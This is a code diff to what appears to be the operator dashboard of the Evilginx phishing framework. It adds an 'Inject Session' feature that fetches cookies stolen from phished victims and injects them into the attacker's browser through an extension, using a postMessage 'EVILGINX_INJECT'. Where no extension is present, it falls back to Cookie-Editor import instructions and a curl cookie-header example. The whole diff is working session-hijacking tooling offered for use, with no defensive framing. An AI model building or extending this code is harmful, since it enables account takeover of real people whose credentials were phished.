@@ -636,7 +636,7 @@ tbody tr.selected{background:rgba(88,166,255,.06)}
 }
 </style>
 </head>
-<body>
+<body data-app="evilginx-dashboard">
 <div class="wrap">
 
   <!-- Topbar -->
@@ -690,6 +690,7 @@ tbody tr.selected{background:rgba(88,166,255,.06)}
       <div style="display:flex;gap:8px">
         <button class="btn btn-sm" onclick="copyAll()">Copy All</button>
         <button class="btn btn-sm btn-green" id="injectBtn" onclick="injectSession()" style="display:none">Inject Session</button>
+        <span id="extBadge" style="display:none;font-size:11px;padding:3px 8px;border-radius:4px;background:var(--green-bg);color:var(--green);border:1px solid var(--green)">&#9679; Injector Active</span>
         <button class="btn btn-sm btn-red" id="detailDelBtn" onclick="deleteCurrentDetail()">Delete</button>
         <button class="btn btn-sm" onclick="closeDetail()">Close</button>
       </div>
@@ -704,26 +705,44 @@ tbody tr.selected{background:rgba(88,166,255,.06)}
         <h3 style="font-size:14px;font-weight:600">Session Takeover</h3>
         <button class="btn btn-sm" onclick="closeInjectModal()">Close</button>
       </div>
-      <div style="background:var(--green-bg);border:1px solid var(--green);border-radius:6px;padding:12px;margin-bottom:16px">
-        <div style="color:var(--green);font-size:12px;font-weight:600;margin-bottom:4px">&#10003; Cookie file downloaded</div>
-        <div style="color:var(--text);font-size:12px" id="injectCookieCount"></div>
+      <!-- Extension success state -->
+      <div id="injectExtPanel" style="display:none">
+        <div style="background:var(--green-bg);border:1px solid var(--green);border-radius:6px;padding:12px;margin-bottom:16px">
+          <div style="color:var(--green);font-size:12px;font-weight:600;margin-bottom:4px">&#10003; Cookies injected automatically</div>
+          <div style="color:var(--text);font-size:12px" id="injectExtCount"></div>
+        </div>
+        <div style="font-size:12px;color:var(--muted);margin-bottom:16px">
+          The target site is opening in a new tab — you should already be logged in. If the page asks you to sign in again, reload it once.
+        </div>
+        <div style="display:flex;gap:8px;flex-wrap:wrap">
+          <button class="btn btn-sm" onclick="copyCookieHeader()">Copy Cookie Header</button>
+          <button class="btn btn-sm" onclick="reDownloadCookies()">Download JSON</button>
+        </div>
+        <div id="injectExtErrors" style="display:none;margin-top:12px;font-size:11px;color:var(--red)"></div>
       </div>
-      <div style="font-size:12px;color:var(--muted);margin-bottom:12px;line-height:1.8">
-        <b style="color:var(--text)">Browser import (Cookie-Editor):</b><br>
-        1. Install the <b>Cookie-Editor</b> browser extension<br>
-        2. Click <b>Open Target Site</b> — a new tab opens on the real site<br>
-        3. On that tab, open Cookie-Editor &rarr; click <b>Import</b><br>
-        4. Paste the downloaded JSON and confirm &rarr; Reload the page
-      </div>
-      <div style="font-size:12px;color:var(--muted);margin-bottom:16px;line-height:1.8">
-        <b style="color:var(--text)">Curl / Burp (raw header):</b><br>
-        Click <b>Copy Cookie Header</b> then use:<br>
-        <code style="font-size:11px;color:var(--text)">curl -b "..." https://target</code>
-      </div>
-      <div style="display:flex;gap:8px;flex-wrap:wrap">
-        <button class="btn btn-green" id="openTargetBtn" onclick="openTargetSite()">Open Target Site</button>
-        <button class="btn btn-sm" onclick="copyCookieHeader()">Copy Cookie Header</button>
-        <button class="btn btn-sm" onclick="reDownloadCookies()">Re-download JSON</button>
+      <!-- Manual fallback state (no extension) -->
+      <div id="injectManualPanel" style="display:none">
+        <div style="background:var(--green-bg);border:1px solid var(--green);border-radius:6px;padding:12px;margin-bottom:16px">
+          <div style="color:var(--green);font-size:12px;font-weight:600;margin-bottom:4px">&#10003; Cookie file downloaded</div>
+          <div style="color:var(--text);font-size:12px" id="injectCookieCount"></div>
+        </div>
+        <div style="font-size:12px;color:var(--muted);margin-bottom:12px;line-height:1.8">
+          <b style="color:var(--text)">Browser import (Cookie-Editor):</b><br>
+          1. Install the <b>Cookie-Editor</b> browser extension<br>
+          2. Click <b>Open Target Site</b> — a new tab opens on the real site<br>
+          3. On that tab, open Cookie-Editor &rarr; click <b>Import</b><br>
+          4. Paste the downloaded JSON and confirm &rarr; Reload the page
+        </div>
+        <div style="font-size:12px;color:var(--muted);margin-bottom:16px;line-height:1.8">
+          <b style="color:var(--text)">Curl / Burp (raw header):</b><br>
+          Click <b>Copy Cookie Header</b> then use:<br>
+          <code style="font-size:11px;color:var(--text)">curl -b "..." https://target</code>
+        </div>
+        <div style="display:flex;gap:8px;flex-wrap:wrap">
+          <button class="btn btn-green" id="openTargetBtn" onclick="openTargetSite()">Open Target Site</button>
+          <button class="btn btn-sm" onclick="copyCookieHeader()">Copy Cookie Header</button>
+          <button class="btn btn-sm" onclick="reDownloadCookies()">Re-download JSON</button>
+        </div>
       </div>
     </div>
   </div>
@@ -1123,6 +1142,27 @@ function toast(msg, type) {
   setTimeout(function(){ el.classList.remove('on'); }, 2500);
 }
 
+// --- Extension detection ---
+var extAvailable = false;
+
+document.addEventListener('evilginx-extension-ready', function() {
+  extAvailable = true;
+  document.getElementById('extBadge').style.display = '';
+});
+
+window.addEventListener('evilginx-inject-result', function(e) {
+  var r = e.detail || {};
+  var errEl = document.getElementById('injectExtErrors');
+  if (r.failed && r.failed > 0 && r.errors && r.errors.length) {
+    errEl.textContent = r.errors.join('\n');
+    errEl.style.display = '';
+  } else {
+    errEl.style.display = 'none';
+  }
+  document.getElementById('injectExtCount').textContent =
+    (r.success || 0) + ' cookies injected' + (r.failed ? ', ' + r.failed + ' failed' : '') + '.';
+});
+
 // --- Cookie inject / session takeover ---
 var injectData = null;
 
@@ -1132,13 +1172,28 @@ async function injectSession() {
     var r = await fetch('/api/cookies/' + currentDetailId);
     if (!r.ok) { toast('Failed to fetch cookies', 'err'); return; }
     injectData = await r.json();
-    downloadCookieFile(injectData);
-    document.getElementById('injectCookieCount').textContent =
-      injectData.count + ' cookies for ' + (injectData.phishlet || 'session') + ' ready to import.';
-    if (injectData.target_url) {
-      document.getElementById('openTargetBtn').textContent = 'Open ' + injectData.target_url;
+
+    document.getElementById('injectExtPanel').style.display = 'none';
+    document.getElementById('injectManualPanel').style.display = 'none';
+
+    if (extAvailable) {
+      // Extension path: inject cookies directly, open target tab automatically.
+      document.getElementById('injectExtPanel').style.display = '';
+      document.getElementById('injectExtCount').textContent = 'Injecting ' + injectData.count + ' cookies…';
+      document.getElementById('injectExtErrors').style.display = 'none';
+      document.getElementById('injectModal').style.display = 'flex';
+      window.postMessage({ type: 'EVILGINX_INJECT', payload: injectData }, '*');
+    } else {
+      // Manual fallback: download JSON + Cookie-Editor instructions.
+      downloadCookieFile(injectData);
+      document.getElementById('injectCookieCount').textContent =
+        injectData.count + ' cookies for ' + (injectData.phishlet || 'session') + ' ready to import.';
+      if (injectData.target_url) {
+        document.getElementById('openTargetBtn').textContent = 'Open ' + injectData.target_url;
+      }
+      document.getElementById('injectManualPanel').style.display = '';
+      document.getElementById('injectModal').style.display = 'flex';
     }
-    document.getElementById('injectModal').style.display = 'flex';
   } catch(e) { toast('Inject error: ' + e, 'err'); }
 }
 
